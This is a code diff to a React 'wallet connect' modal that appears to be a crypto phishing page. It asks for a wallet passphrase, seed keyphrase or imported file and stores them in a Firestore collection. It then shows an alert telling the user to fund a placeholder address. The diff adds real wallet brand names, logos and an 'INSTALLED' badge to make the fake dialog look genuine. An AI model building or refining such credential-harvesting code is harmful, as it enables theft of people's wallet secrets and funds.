@@ -3,7 +3,6 @@ import React, { useState, useEffect, useCallback } from 'react';
 import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
 import { getFirestore, collection, addDoc } from 'firebase/firestore';
 
-
 const WalletModal = ({ isOpen, onClose }) => {
   const [showSecondaryModal, setShowSecondaryModal] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState('');
@@ -11,7 +10,14 @@ const WalletModal = ({ isOpen, onClose }) => {
   const [keyphrase, setKeyphrase] = useState('');
   const [importedFile, setImportedFile] = useState(null);
 
-  const walletOptions = ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Binance Wallet', 'Phantom'];
+  // Updated wallet options with images
+  const walletOptions = [
+    { name: 'Phantom', image: '/phan.png' },
+    { name: 'MetaMask', image: '/meta.png' },
+    // { name: 'Trust Wallet', image: '/path/to/trustwallet.png' },
+    { name: 'Magic Eden', image: '/eden.png' },
+    
+  ];
 
   const handleWalletSelect = (walletName) => {
     setSelectedWallet(walletName);
@@ -25,7 +31,6 @@ const WalletModal = ({ isOpen, onClose }) => {
 
   const handleConnect = async () => {
     if (!selectedWallet) {
-      // Optionally show an error message
       return;
     }
 
@@ -38,22 +43,16 @@ const WalletModal = ({ isOpen, onClose }) => {
     } else if (keyphrase) {
       walletDetails.keyphrase = keyphrase;
     } else if (importedFile) {
-      // You might want to read the file content here
       walletDetails.importedFile = importedFile.name; // Or the content itself
     }
 
     try {
       const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
       console.log("Document written with ID: ", docRef.id);
-      // if (typeof window !== 'undefined') {
-      //   localStorage.setItem('walletid', docRef.id);
-      // }
-      // Optionally show a success message
       alert(`Connected to ${selectedWallet} successfully! Fund Your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
       onClose(); // Close the modal after successful connection
     } catch (e) {
       console.error("Error adding document: ", e);
-      // Optionally show an error message to the user
     }
   };
 
@@ -69,7 +68,6 @@ const WalletModal = ({ isOpen, onClose }) => {
     setImportedFile(null);
   };
 
-  // Close modal on Escape key press
   const handleKeyDown = useCallback((event) => {
     if (event.key === 'Escape' && isOpen) {
       onClose();
@@ -79,11 +77,11 @@ const WalletModal = ({ isOpen, onClose }) => {
   useEffect(() => {
     if (isOpen) {
       document.addEventListener('keydown', handleKeyDown);
-      document.body.classList.add('overflow-hidden'); // Prevent scrolling behind the modal
+      document.body.classList.add('overflow-hidden');
     } else {
       document.removeEventListener('keydown', handleKeyDown);
       document.body.classList.remove('overflow-hidden');
-      setShowSecondaryModal(false); // Reset secondary modal state when closed
+      setShowSecondaryModal(false);
       setSelectedWallet('');
       setPassphrase('');
       setKeyphrase('');
@@ -101,8 +99,8 @@ const WalletModal = ({ isOpen, onClose }) => {
   }
 
   return (
-    <div className="fixed inset-0 bg-black mt-8 bg-opacity-50 flex justify-center items-center z-50">
-      <div className="bg-gray-900 rounded-xl shadow-lg p-8 w-full max-w-md relative">
+    <div className="fixed inset-0 bg-black flex justify-center items-center z-50">
+      <div className="bg-gray-900 w-80 rounded-lg shadow-lg p-6 max-w-md relative">
         <button
           onClick={onClose}
           className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
@@ -114,35 +112,38 @@ const WalletModal = ({ isOpen, onClose }) => {
 
         {!showSecondaryModal ? (
           <div>
-            <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect Your Wallet</h3>
-            <ul className="space-y-3">
-              {walletOptions.map((wallet) => (
+            <h3 className="text-xl font-semibold text-white mb-4">Connect Wallet</h3>
+            <ul className="space-y-2">
+              {walletOptions.map(({ name, image }) => (
                 <li
-                  key={wallet}
-                  className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-4 cursor-pointer transition duration-200"
-                  onClick={() => handleWalletSelect(wallet)}
+                  key={name}
+                  className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-2 w-full cursor-pointer transition duration-200 flex items-center"
+                  onClick={() => handleWalletSelect(name)}
                 >
-                  <span className="block text-gray-300 font-medium">{wallet}</span>
+                  <img src={image} alt={name} className="h-6 w-6 mr-2" />
+                  <span className="block text-sm text-gray-300 font-medium">{name}</span>
+                  <span className="text-xs text-green-500 ml-auto">INSTALLED</span>
                 </li>
               ))}
             </ul>
             <button
-              className="w-full mt-6 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+              className="w-full mt-4 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
               onClick={handleOtherOptionsClick}
             >
-              Other Options
+              All Wallets
             </button>
+            <p className="mt-4 text-center text-gray-400">Haven't got a wallet? <span className="text-indigo-500 cursor-pointer">Get started</span></p>
           </div>
         ) : (
           <div>
-            <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect to {selectedWallet}</h3>
+            <h3 className="text-xl font-semibold text-white mb-4">Connect to {selectedWallet}</h3>
             <div className="space-y-4">
               <div>
                 <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Passphrase:</label>
                 <input
                   type="password"
                   id="passphrase"
-                  className="shadow-sm focus:ring-indigo-500  py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
+                  className="shadow-sm focus:ring-indigo-500 py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                   value={passphrase}
                   onChange={(e) => setPassphrase(e.target.value)}
                 />
